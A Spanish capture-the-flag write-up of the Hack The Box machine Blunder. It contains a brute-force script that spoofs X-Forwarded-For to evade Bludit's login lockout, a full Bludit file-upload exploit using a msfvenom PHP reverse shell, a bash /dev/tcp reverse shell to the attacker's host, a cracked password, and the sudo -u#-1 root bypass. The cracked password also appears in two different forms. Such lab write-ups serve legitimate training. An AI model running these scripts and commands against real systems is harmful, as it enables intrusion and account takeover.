---
layout: post
title:  "Maquina  Retirada Blunder de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada BLUNDER
tags: HTB, Bypass, Python3, BruteForce, Web Hacking, Sudo 1.8, Maquinas Retiradas, Writeup
---

# Blunder ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.191       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
$" nmap -sC -sV -p80 -oN target 10.10.10.191       "
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
``` 
Vemos que solo tiene el puerto 80/http abierto

Con la herramienta Wfuzz procedemos a escanear por rutas y directorios en la IP
```bash
# wfuzz -c -L --hc=404 --hl=170 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt http://10.10.10.191/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.191/FUZZ
Total requests: 207643
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                   
=====================================================================
000000026:   200        105 L    303 W      3280 Ch     "about"                                   
000000256:   200        70 L     157 W      2385 Ch     "admin"                                   
000002387:   200        110 L    387 W      3959 Ch     "usb"      
```
miramos en estos directorios y no encontramos ninguna informacion valiosa...
Volvemos a usar la herramienta `Wfuzz` para buscar por extensiones (PHP y TXT) usando un Doble Fuzzing:

```bash
$" wfuzz -c -L --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -w dicc http://10.10.10.191/FUZZ.FUZ2Z      "
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.191/FUZZ.FUZ2Z
Total requests: 415286
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                   
=====================================================================                                          
000001397:   200        0 L      5 W        30 Ch       "install - php"                           
000003310:   200        1 L      4 W        22 Ch       "robots - txt"                            
000004668:   200        4 L      23 W       118 Ch      "todo - txt"      
```
Listamos el archivo encontrado
```bash
"http://10.10.10.191/todo.txt   "

-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform "fergus" that the new blog needs images - PENDING					
-Encontramos un "User": "fergus"
``` 
Teniendo un Usuario valido, probamos a hacer fuerza bruta contra el panel login del CMS Bludit y nos salta un bloqueo a los 10 intentos.
Miramos en searchsploit Bludit CMS 
Vemos que hay varias reportes interesantes
Nos fijamos en el de Metasploit y lo inspeccionamos para ver que esta haciendo, y vemos que para hacer fuerza bruta cambia el valor de la cabecera  X-Forwarded-For

# Haciendo Bypass Brute Force al Panel Login de Bludit CMS
Nos montamos un script en python3 para conseguir hacer fuerza bruta contra el panel login y saltarnos el bloqueo atraves de la cabecera X-Forwarded-For
```python
#!/usr/bin/python3

import sys
import time  
import requests
import signal
import re 
import pdb

from pwn import *  

def def_handler(sig, frame):
        print("\n[*] Saliendo . . .\n")
        sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Variable Global
main_url = "http://10.10.10.191/admin/login.php"


def makeRequest():
# peticion s que almacena la session(Cookies, etc)
        s = requests.session()

# Creamos la variable f que nos abra el archivo diccionario en modo read
        f = open("diccionario.txt", "r")
# Barras de Progreso
        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando Ataque de Fuerza Bruta")
        time.sleep(2)

# Creando el bucle para realizar fuerza bruta  
        for password in f.readlines():

# Pillando el tokenCSRF con la libreria RE y usando expresiones regulares para filtrar por la data de "value=", a niver de la respuesta de la peticion response
                response = s.get(main_url)
                tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', response.text)[0]

# Campo del login, Data que tramitamos
                data_post = {
                'tokenCSRF' : tokenCSRF,
                'username' : 'fergus',
                'password' : '%s' % password.strip("\n") 
                }

# Usamos estos headers para saltarnos las restricciones de IP Block a nivel web
                headers_login = {

                'User-Agent' : 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Referer' : 'http://10.10.10.191/admin/login',
                'X-Forwarded-For' : '%s' % password.strip('\n')
                }

# Barra de progreso de peticions * passwords
                p1.status("Probando con la password %s" % password.strip("\n"))

# Variable r que es la peticcion HTTP via POST y tramita con los siguientes argumentos
                r = s.post(main_url, data=data_post, headers=headers_login)

# Comprobacion de password correcta
                if "Username or password incorrect" not in r.text:
                        p1.success("La password es %s" % password.strip('\n'))
                        sys.exit(0)

if __name__ == '__main__':

        makeRequest()
```

Con el script listo para ejecutarse, procedemos a crearnos un `diccionario.txt` de las palabras de la web con la herramienta `"CEWL"`
[Uso de CEWL](https://esgeeks.com/como-utilizar-cewl/)
```bash
$ cewl http://10.10.10.191 -w diccionario.txt
``` 
Ejecutamos el script en python3 y nos reporta una password `"RolandDeschain"`

```bash
Buscamos google por BLUDIT CMS y vemos un repositorio de github con mas rutas interesantes como la de “bl-plugins”

 http://10.10.10.191/bl-plugins/backup/metadata.json
									
|                 author |                                                " Bludit" |
| email | "" |
| website | "https://plugins.bludit.com" |
| version | "3.9.2" |
| releaseDate | "2019-06-21" |
| license | "MIT" |
| compatible | "3.9.2" |
| notes | "" |
``` 
Ya tenemos la version del Bludit CMS, y tras una segunda busqueda encontramos este exploit en python3
```python
# Title: Bludit 3.9.2 - Directory Traversal
# Author: James Green
# Date: 2020-07-20
# Vendor Homepage: https://www.bludit.com
# Software Link: https://github.com/bludit/bludit
# Version: 3.9.2
# Tested on: Linux Ubuntu 19.10 Eoan# CVE: CVE-2019-16113
# 
# Special Thanks to Ali Faraj (@InfoSecAli) and authors of MSF Module https://www.exploit-db.com/exploits/47699

#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png

#!/usr/bin/env python3

import requests
import re
import argparse
import random
import string
import base64
import threading

from requests.exceptions import Timeout
from pwn import *

# Cambiando los Valores a los nuestros
url = 'http://10.10.10.191'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME
lport = 443

# Paso 1
# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' > evil.png
# echo -e "<?php $(cat evil.png)" > evil.png 
payload = 'evil.png'  # CREATE ME

# Paso 2
# echo "RewriteEngine off" > .htaccess
# echo "AddType application/x-httpd-php .png" >> .htaccess
payload2 = '.htaccess'  # CREATE ME

def login(url,username,password):
    """ Log in with provided admin creds, grab the cookie once authenticated """

    session = requests.Session()
    login_page = session.get(url + "/admin/")
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',
                           login_page.text
                 ).group(1)
    cookie = ((login_page.headers["Set-Cookie"]).split(";")[0].split("=")[1])
    data = {"save":"",
            "password":password,
            "tokenCSRF":csrf_token,
            "username":username}
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer": url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
               "Content-Type":"application/x-www-form-urlencoded"
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/",
                            data=data,
                            headers=headers,
                            cookies=cookies,
                            allow_redirects = False
               )

    print("cookie: " + cookie)
    return cookie

def get_csrf_token(url,cookie):
    """ Grab the CSRF token from an authed session """

    session = requests.Session()
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate"}
    cookies = {"BLUDIT-KEY":cookie}
    response = session.get(url + "/admin/dashboard",
                           headers=headers,
                           cookies=cookies
               )
    csrf_token = response.text.split('var tokenCSRF = "')[1].split('"')[0]

    print("csrf_token: " + csrf_token)
    return csrf_token

def upload_evil_image(url, cookie, csrf_token, payload, override_uuid=False):
    """ Upload files required for to execute PHP from malicious image files. Payload and .htaccess """

    session = requests.Session()
    files= {"images[]": (payload,
                         open(payload, "rb"),
                         "multipart/form-data",
                         {"Content-Type": "image/png", "filename":payload}
                        )}
    if override_uuid:
        data = {"uuid": "../../tmp/temp",
                "tokenCSRF":csrf_token}
    else:
        # On the vuln app, this line occurs first:
        # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
        # Even though there is a file extension check, it won't really stop us
        # from uploading the .htaccess file.
        data = {"tokenCSRF":csrf_token}
    headers = {"Origin":url,
               "Accept":"*/*",
               "X-Requested-With":"XMLHttpRequest",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/new-content",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/ajax/upload-images", data=data, files=files, headers=headers, cookies=cookies)
    print("Uploading payload: " + payload)
# Creamos una variable que sea una peticion a la ruta del archivo malicioso para que se ejecute a nivel de sistema por peticon GET HTTP
    r = session.get(url + "/bl-content/tmp/temp/evil.png" )

if __name__ == "__main__":

    cookie = login(url, username, password)
    token = get_csrf_token(url, cookie)
    upload_evil_image(url, cookie, token, payload, True)
    upload_evil_image(url, cookie, token, payload2)
```
Con este script tenemos que crearnos dos archivitos especificados en los pasos arriba, setear los datos que nos pide. Lo hacemos
``` 
# msfvenom -p php/reverse_php LHOST=10.10.15.4 LPORT=443 -f raw -b '"' > evil.png

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 4053 (iteration=0)
php/base64 chosen with final size 4053
Payload size: 4053 bytes                                                                                                       
                                                                                                          
# echo -e "<?php $(cat evil.png)" > "evil.png" 
                                                                                                          
# echo "RewriteEngine off" > ".htaccess"                                               
# echo "AddType application/x-httpd-php .png" >> ".htaccess"
``` 

Lo siguiente es ponerse a la escucha con netcat
```bash
$" nc -lvnp 443 "
```
Ejecutamos el exploit y recibimos las shell, pero resulta que tenemos que enviarnos otra reverse_shell con el comando
```bash
$ " bash -c 'bash -i >& /dev/tcp/10.10.15.4/444 0>&1'     "
``` 
Conseguimos una `Reverse-Shell` como `www-data` en el puerto 444
Hacemos un tratamiento de la `tty`
```bash
$ script /dev/null -c bash
$ ctrl Z
$ stty raw -echo; fg
$ reset
$ xterm
$ export TERM=xterm
$ export SHELL=bash
```
Configuramos las rows y columns, chequeando con `stty -a`en nuestra terminal
`$ stty rows 51 columns 181`

# Escalada de Privilegios y busqueda de la flag User.txt

Enumeramos el sistema:
Encontramos dos usuarios `hugo` y `shaun`
`$ find \ -name user.txt 2>/dev/null` y nos devuelve que el archivo se encuentra en el directorio de HUGO al cual no tenemos acceso
Ya sabemos que tenemos que convertirnos en el usuario HUGO
`$ grep -r -i "hugo" 2>/dev/null` y en los dos primeros matches, encontramos dos archivos que hacen referencia a database, nos movemos a la ruta
listamos los ficheros curiosos y efectivamente:
``` bash
 $"www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php" 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}

"Password": "Password120"			contraseña crackeada con Crackstation
```
Ya podemos hacer un `su hugo` introducimos la password `Password210`

# Conseguir el Privesc para el usuario Root

Encontramos que haciendo el siguiente comando para listar la version de sudo

Listando las versions de SUDO con el commando `apt list | grep “sudo”`
vemos la version de SUDO instalada 1.8.5

Buscamos por `Searchsploit` y resulta que hay para esa version una vulnerabilidad que salio hace poco llamada Security Bypass
```bash
"sudo 1.8.27 - Security Bypass                                                          linux/local/47502.py	"                                                                                    
```
Haciendo:  `$ sudo -u#-1 /bin/bash`  
```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# 
```
Lo conseguimos ya somos `root` y ya podriamos listar la flag `root.txt` en la ruta `/root/root.txt`
